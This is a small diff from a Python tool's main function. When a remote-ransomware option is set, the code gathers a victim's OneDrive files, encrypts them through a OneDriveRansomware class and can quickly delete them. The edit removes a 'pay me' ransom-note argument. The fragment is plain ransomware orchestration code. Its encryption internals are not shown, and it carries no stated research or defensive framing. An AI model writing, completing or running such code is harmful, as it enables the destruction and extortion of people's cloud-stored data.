@@ -102,7 +102,7 @@ def main():
     if args.remote_ransomware:
         onedrive_ransomware = OneDriveRansomware(onedrive_session, )
         all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session, args.key_path)
-        onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, "pay me", quick_delete=configs[ConfigKey.QUICK_DELETE.value])
+        onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, quick_delete=configs[ConfigKey.QUICK_DELETE.value])
 
     
 
